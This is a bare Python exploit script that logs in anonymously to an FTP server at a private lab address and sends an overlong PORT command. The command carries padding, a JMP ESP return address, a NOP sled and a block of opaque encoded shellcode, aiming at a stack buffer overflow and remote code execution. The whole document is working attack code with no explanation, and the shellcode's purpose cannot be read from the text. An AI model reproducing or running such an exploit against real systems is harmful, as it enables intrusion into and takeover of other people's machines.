#!/usr/bin/python
import sys,socket
from time import sleep
import struct
 
padding = 'A' * 2007
jmpesp = struct.pack("<I",0x75B25B5F)     
nops = "\x90" * 20

shellcode =  ""
shellcode += "\xbd\xbb\x9e\x0e\xbb\xdb\xc9\xd9\x74\x24\xf4"
shellcode += "\x5a\x29\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e"
shellcode += "\x03\xd1\x90\xec\x4e\xd9\x45\x72\xb0\x21\x96"
shellcode += "\x13\x38\xc4\xa7\x13\x5e\x8d\x98\xa3\x14\xc3"
shellcode += "\x14\x4f\x78\xf7\xaf\x3d\x55\xf8\x18\x8b\x83"
shellcode += "\x37\x98\xa0\xf0\x56\x1a\xbb\x24\xb8\x23\x74"
shellcode += "\x39\xb9\x64\x69\xb0\xeb\x3d\xe5\x67\x1b\x49"
shellcode += "\xb3\xbb\x90\x01\x55\xbc\x45\xd1\x54\xed\xd8"
shellcode += "\x69\x0f\x2d\xdb\xbe\x3b\x64\xc3\xa3\x06\x3e"
shellcode += "\x78\x17\xfc\xc1\xa8\x69\xfd\x6e\x95\x45\x0c"
shellcode += "\x6e\xd2\x62\xef\x05\x2a\x91\x92\x1d\xe9\xeb"
shellcode += "\x48\xab\xe9\x4c\x1a\x0b\xd5\x6d\xcf\xca\x9e"
shellcode += "\x62\xa4\x99\xf8\x66\x3b\x4d\x73\x92\xb0\x70"
shellcode += "\x53\x12\x82\x56\x77\x7e\x50\xf6\x2e\xda\x37"
shellcode += "\x07\x30\x85\xe8\xad\x3b\x28\xfc\xdf\x66\x25"
shellcode += "\x31\xd2\x98\xb5\x5d\x65\xeb\x87\xc2\xdd\x63"
shellcode += "\xa4\x8b\xfb\x74\xcb\xa1\xbc\xea\x32\x4a\xbd"
shellcode += "\x23\xf1\x1e\xed\x5b\xd0\x1e\x66\x9b\xdd\xca"
shellcode += "\x29\xcb\x71\xa5\x89\xbb\x31\x15\x62\xd1\xbd"
shellcode += "\x4a\x92\xda\x17\xe3\x39\x21\xf0\x06\xbe\x2b"
shellcode += "\x0f\x7f\xbc\x2b\x0e\xc4\x49\xcd\x7a\x2a\x1c"
shellcode += "\x46\x13\xd3\x05\x1c\x82\x1c\x90\x59\x84\x97"
shellcode += "\x17\x9e\x4b\x50\x5d\x8c\x3c\x90\x28\xee\xeb"
shellcode += "\xaf\x86\x86\x70\x3d\x4d\x56\xfe\x5e\xda\x01"
shellcode += "\x57\x90\x13\xc7\x45\x8b\x8d\xf5\x97\x4d\xf5"
shellcode += "\xbd\x43\xae\xf8\x3c\x01\x8a\xde\x2e\xdf\x13"
shellcode += "\x5b\x1a\x8f\x45\x35\xf4\x69\x3c\xf7\xae\x23"
shellcode += "\x93\x51\x26\xb5\xdf\x61\x30\xba\x35\x14\xdc"
shellcode += "\x0b\xe0\x61\xe3\xa4\x64\x66\x9c\xd8\x14\x89"
shellcode += "\x77\x59\x24\xc0\xd5\xc8\xad\x8d\x8c\x48\xb0"
shellcode += "\x2d\x7b\x8e\xcd\xad\x89\x6f\x2a\xad\xf8\x6a"
shellcode += "\x76\x69\x11\x07\xe7\x1c\x15\xb4\x08\x35"
 
buf = padding + jmpesp + nops + shellcode
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.0.2.4',21))
s.recv(1024)
s.send("USER " + "Anonymous")
s.recv(1024)
s.send("PASS pass")
s.recv(1024)        
s.send('PORT ' + buf)
s.recv(1024)
s.close()
